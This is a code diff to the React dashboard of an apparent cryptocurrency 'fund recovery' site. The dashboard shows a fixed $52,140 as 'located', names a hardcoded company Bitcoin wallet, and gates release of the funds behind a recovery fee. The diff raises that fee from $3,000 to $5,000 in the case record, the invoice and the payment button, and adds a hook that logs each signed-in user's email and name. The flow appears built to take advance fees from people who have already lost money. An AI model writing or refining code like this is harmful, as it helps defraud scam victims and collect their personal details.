@@ -3,7 +3,7 @@ import type { Page } from '../App'
 import type { AuthUser } from '../lib/auth'
 import { LOGO_URL } from '../lib/branding'
 import { addReceipt } from '../lib/receipts'
-import { loadList, saveList } from '../lib/storage'
+import { loadList, saveList, logClientSignIn } from '../lib/storage'
 import {
   Search, FileText, Clock,
   ArrowLeft, AlertTriangle, Check, ChevronRight,
@@ -14,7 +14,7 @@ import type { LucideIcon } from 'lucide-react'
 
 const COMPANY_WALLET = 'bc1qs9qkg8crclkyxcjlj6vr3hlwuz60d6wu7yhfta'
 const BTC_PRICE = 66240
-const RECOVERY_FEE_USD = 3000
+const RECOVERY_FEE_USD = 5000
 
 interface Case {
   id: string
@@ -124,6 +124,13 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
 
   const scanInterval = useRef<ReturnType<typeof setInterval> | null>(null)
   const flowTimer = useRef<ReturnType<typeof setTimeout> | null>(null)
+  const loggedSignIn = useRef(false)
+
+  useEffect(() => {
+    if (!user || loggedSignIn.current) return
+    loggedSignIn.current = true
+    logClientSignIn(user.email, user.name)
+  }, [user])
 
   const clearScanTimers = () => {
     if (scanInterval.current) clearInterval(scanInterval.current)
@@ -180,7 +187,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
           amount: '$52,140',
           progress: 100,
           created,
-          feeRequired: '$3,000',
+          feeRequired: '$5,000',
           feePaid: false,
           eta: 'Awaiting fee',
           wallet: target,
@@ -188,7 +195,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
         setInvoices(prev => [{
           id: `INV-${new Date().getFullYear()}-${Date.now().toString(36).toUpperCase()}`,
           caseId,
-          amount: '$3,000.00',
+          amount: '$5,000.00',
           currency: 'USD',
           status: 'Pending',
           date: created,
@@ -449,7 +456,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
                     {c.status === 'Funds Located' && !c.feePaid && (
                       <button onClick={() => { setScanAddr(c.wallet); setTab('scan'); setPhase('payment') }}
                         className="mt-4 w-full bg-[#f7931a] text-white font-medium py-2.5 rounded-xl hover:bg-[#e07e10] transition-all text-sm flex items-center justify-center gap-2">
-                        Pay Recovery Fee — $3,000 <ChevronRight size={15} />
+                        Pay Recovery Fee — $5,000 <ChevronRight size={15} />
                       </button>
                     )}
                     {c.feePaid && (
